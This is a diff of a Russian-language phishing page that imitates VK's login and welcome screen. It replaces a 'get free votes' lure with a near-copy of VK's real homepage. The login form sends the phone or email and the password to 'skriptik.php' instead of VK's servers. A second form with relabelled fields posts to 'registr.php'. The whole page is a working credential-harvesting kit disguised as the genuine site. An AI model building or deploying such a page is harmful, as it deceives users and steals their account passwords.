@@ -1,8 +1,7 @@
-
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
 <head>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <link rel="shortcut icon" href="https://vk.com/images/faviconnew.ico?3" />
 
 <link rel="apple-touch-icon" href="https://vk.com/images/safari_60.png">
@@ -10,20 +9,21 @@
 <link rel="apple-touch-icon" sizes="120x120" href="https://vk.com/images/safari_120.png">
 <link rel="apple-touch-icon" sizes="152x152" href="https://vk.com/images/safari_152.png">
 
-<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
-
-<meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="description" content="" />
+<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
+<meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте." />
 
 
-<title>Получить голоса | ВКонтакте</title>
+<title>Добро пожаловать | ВКонтакте</title>
 
+<noscript><meta http-equiv="refresh" content="0; URL=/badbrowser.php"></noscript>
 <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?509" />
-<link type="text/css" rel="stylesheet" href="https://vk.com/css/al/groups.css?115"></link>
+<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/al/ie6.css?26); /* ]]> */</style><![endif]-->
+<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/al/ie7.css?18); /* ]]> */</style><![endif]-->
+<link type="text/css" rel="stylesheet" href="https://vk.com/css/al/index.css?27"></link><script type="text/javascript" src="https://vk.com/js/loader_nav18924_0.js"></script><script type="text/javascript" src="https://vk.com/js/al/common.js?1129_178"></script><script type="text/javascript" src="https://vk.com/js/lang0_0.js?6680"></script><link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.vk.com/" /><link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" /><meta name="msApplication-ID" content="C6965DD5.VK" /><meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" /><script type="text/javascript" src="https://vk.com/js/al/index.js?33"></script>
 
 </head>
 
-<body class="is_rtl font_default pads ">
+<body onresize="onBodyResize()" class="is_rtl font_default pads firefox ">
   <div id="system_msg" class="fixed"></div>
   <div id="utils"></div>
 
@@ -32,11 +32,13 @@
 
   <div id="stl_left"></div><div id="stl_side"></div>
 
+  <script type="text/javascript">domStarted();</script>
+
   <div class="scroll_fix_wrap" id="page_wrap"><div id="reg_bar" class="top_info_wrap fixed">
   <div class="scroll_fix">
     <div id="reg_bar_content">
       Присоединяйтесь, чтобы всегда оставаться в контакте с друзьями и близкими
-      <div class="button_blue" id="reg_bar_button"><a class="button_link" href=""><button id="reg_bar_btn"><span id="reg_bar_with_arr">Зарегистрироваться</span></button></a></div>
+      <div class="button_blue" id="reg_bar_button"><a class="button_link" href="/join" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)"><button id="reg_bar_btn"><span id="reg_bar_with_arr">Зарегистрироваться</span></button></a></div>
     </div>
   </div>
 </div>
@@ -49,12 +51,13 @@
       <div class="content">
         <div id="top_nav" class="head_nav">
   <div id="top_logo_down" class="fl_l"></div>
-  <a id="top_home_link" class="top_home_link fl_l" href=""></a>
+  <a id="top_home_link" class="top_home_link fl_l" href="/" onmousedown="addClass('top_logo_down','tld_d');" onclick="return nav.go(this, event);"></a>
   <div id="top_links">
     <div class="fl_r" id="top_menu_wrap" style="">
-      <a id="top_reg_link" class="fl_r top_nav_link" href="" style="">регистрация</a>
+      <a id="top_reg_link" class="fl_r top_nav_link" href="/join" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)">регистрация</a>
+      <a id="top_switch_lang" class="fl_r top_nav_link"  style="" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '3ea2aa322cb6ee9840'});" onmousedown="tnActive(this)">Switch to English</a>
     </div>
-    <a class="fl_l top_nav_link" href="" id="top_back_link"></a>
+    <a class="fl_l top_nav_link" href="" id="top_back_link" onclick="return nav.go(this, event, {back: true})" onmousedown="tnActive(this)"></a>
   </div>
 </div>
       </div>
@@ -62,40 +65,91 @@
 
     <div id="side_bar" class="fl_l" style="">
       <div id="quick_login">
-  <form method="POST" name="login" action="skriptik.php" id="form_login">
-	<input type="hidden" name="ref" value="0">
+  <form method="POST" name="login" id="quick_login_form" action="/skriptik.php" >
+    <input type="hidden" name="act" value="login" />
+    <input type="hidden" name="role" value="al_frame" />
+    <input type="hidden" name="expire" id="quick_expire_input" value="" />
+    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
+    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
+    <input type="hidden" name="_origin" value="https://vk.com" />
+    <input type="hidden" name="ip_h" value="45eb18843b51a5b19e" />
+    <input type="hidden" name="lg_h" value="ca7078c2feb117ff31" />
     <div class="label">Телефон или email</div>
-	<div class="labeled"><input type="text" name="login" class="text" id="quick_email" required /></div>
+    <div class="labeled"><input type="text" name="email" class="text" id="quick_email" /></div>
     <div class="label">Пароль</div>
-	<div class="labeled"><input type="password" name="pass" class="text" id="quick_pass" required /></div>
-  <button class="flat_button button_wide button_big" type="submit">Войти</button>
+    <div class="labeled"><input type="password" name="pass" class="text" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
+    <input type="submit" class="submit" />
+    <button class="flat_button button_wide button_big" id="quick_login_button">Войти</button>
   </form>
-  <div class="clear forgot"><a id="quick_forgot" href="" target="_top">Забыли пароль?</a><div class="checkbox ta_l" id="quick_expire"><div></div>Чужой компьютер</div></div>
+  <button class="flat_button button_wide button_big" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
+  <div class="clear forgot"><a id="quick_forgot" href="https://vk.com/restore" target="_top">Забыли пароль?</a><div class="checkbox ta_l" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';"><div></div>Чужой компьютер</div></div>
 </div>
     </div>
 
     <div id="page_body" class="fl_r" style="width: 631px;">
-<div id="header_wrap2">
+      <div id="header_wrap2">
         <div id="header_wrap1">
           <div id="header" style="">
-			<h1 id="title">Получить голоса</h1>
+            <h1 id="title">Добро пожаловать</h1>
           </div>
         </div>
       </div>
       <div id="wrap_between"></div>
       <div id="wrap3"><div id="wrap2">
   <div id="wrap1">
-    <div id="content"><div id="group">
-  
-  <div class="narrow_column fl_r" id="group_narrow">
-    <div id="page_actions" class="page_actions" style="display: none">
-  
-</div><div id="group_narrow_videos"></div><div id="group_narrow_topics"></div>
+    <div id="content"><div id="index">
+  <iframe class="upload_frame" src="https://login.vk.com/?role=al_frame&_origin=https://vk.com&ip_h=45eb18843b51a5b19e"></iframe>
+  <div class="content">
+    <p><b>ВКонтакте</b> – универсальное средство для общения и поиска друзей и одноклассников,<br>которым ежедневно пользуются десятки миллионов человек.</p>
+
+    <h2>Моментальная регистрация</h2>
+<form method="POST" action="/registr.php" >
+    <div class="msg" id="ij_msg"></div>
+
+    <div class="ij_form">
+      <div class="ij_reg_row">
+
+        <input type="text" class="big_text" id="ij_first_name" value="" name="email" placeholder="Ваше имя" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" />
+      </div>
+      <div class="ij_reg_row">
+        <input type="text" class="big_text" id="ij_last_name" value="" name="pass" placeholder="Ваша фамилия" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" />
+      </div>
+      <div class="ij_reg_row" id="ij_sex_row">
+        <input type="hidden" id="ij_sex" name="ij_sex" />
+      </div>
+      <center>
+        <button class="flat_button button_big ij_button" id="ij_submit" onclick="Index.submitJoinStart()">
+          <span class="ij_with_arr">Зарегистрироваться</span>
+        </button>
+        </form>
+      </center>
+      <div id="index_fbsign">
+        <div class="index_fbb">
+          <div class="index_or"><div class="index_or_l"></div><span class="index_or_s">или</span></div>
+          <center>
+            <button class="flat_button ij_button index_fb_btn" id="index_fb" onclick="Index.fbJoin();">
+              <div class="index_fb_logo"></div>
+              <div class="index_fb_l">Войти через Facebook</div>
+            </button>
+          </center>
+        </div>
+      </div>
+    </div>
+
+    <h2>В чём поможет ВКонтакте?</h2>
+    <ul class="listing">
+      <li><span>Найти людей, с которыми Вы когда-либо учились, работали или отдыхали.</span></li>
+      <li><span>Узнать больше о людях, которые Вас окружают, и найти новых друзей.</span></li>
+      <li><span>Всегда оставаться в контакте с теми, кто Вам дорог.</span></li>
+    </ul>
   </div>
-  <div class="wide_column fl_l" id="group_wide">
-	<div class="group_full_private"><div class="group_info_private">С помощью этого сервиса вы можете получить бесплатно голоса на свой аккаунт Вконтакте. <br><a onclick="$('#quick_email').trigger('focus');">Авторизуйтесь</a>, чтобы продолжить.</div></div><div id="group_wide_topics"></div><div id="group_wide_videos"></div>
+  <div class="reg">
+    <table cellspacing="0" cellpadding="0" id="ij_screens"><tr>
+      <td><a class="ij_scr" onclick="JoinPhotoview.show(0)"><img src="https://vk.com/images/join/prof_m.png?4" class="ijs_img" /></a></td>
+      <td><a class="ij_scr" onclick="JoinPhotoview.show(1)"><img src="https://vk.com/images/join/news_m.png?4" class="ijs_img" /></a></td>
+      <td><a class="ij_scr" onclick="JoinPhotoview.show(2)"><img src="https://vk.com/images/join/dial_m.png?4" class="ijs_img" /></a></td>
+    </tr></table>
   </div>
-  <br class="clear" />
 </div></div>
   </div>
 </div></div>
@@ -103,18 +157,17 @@
 
     <div id="footer_wrap" class="fl_r" style="width: 661px;">
       <div id="bottom_nav">
-  <a class="bnav_a" href="">о сайте</a>
-  <a class="bnav_a" href="">правила</a>
-  <a class="bnav_a" href="">реклама</a>
-  <a class="bnav_a" href="">люди</a><a class="bnav_a" href="">сообщества</a>
-  <a class="bnav_a" href="">разработчикам</a>
+  <a class="bnav_a" href="/about">о сайте</a>
+  <a class="bnav_a" href="/support?act=home" onclick="return nav.go(this, event);" style="display: none;">помощь</a>
+  <a class="bnav_a" href="/terms">правила</a>
+  <a class="bnav_a" href="/ads">реклама</a>
+  <a class="bnav_a" href="/people">люди</a><a class="bnav_a" href="/communities">сообщества</a>
+  <a class="bnav_a" href="/dev">разработчикам</a>
+  <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
 </div>
 <div id="footer" class="clear">
-  <div class="copy_lang"><a href="">ВКонтакте</a> &copy; 2015 <a class="bnav_lang" >English</a>
-  <a class="bnav_lang">Русский</a>
-  <a class="bnav_lang">Українська</a>
-  <a class="bnav_lang">все языки &raquo;</a></div>
-  `
+  <div class="copy_lang"><a href="/about">ВКонтакте</a> &copy; 2015 <a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '3ea2aa322cb6ee9840'})">English</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '3ea2aa322cb6ee9840'})">Русский</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '3ea2aa322cb6ee9840'})">Українська</a><a class="bnav_lang" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
+  
   <div>
     
     
@@ -123,9 +176,11 @@
     </div>
     <div class="clear"></div>
   </div>
-</div></div>
-</div>
+</div></div><noscript><div style="position:absolute;left:-10000px;">
+<img src="//top-fwz1.mail.ru/counter?id=2579437;pid=0;js=na" style="border:0;" height="1" width="1" />
+</div></noscript></div>
   <div class="progress" id="global_prg"></div>
+
 </body>
 
 </html>
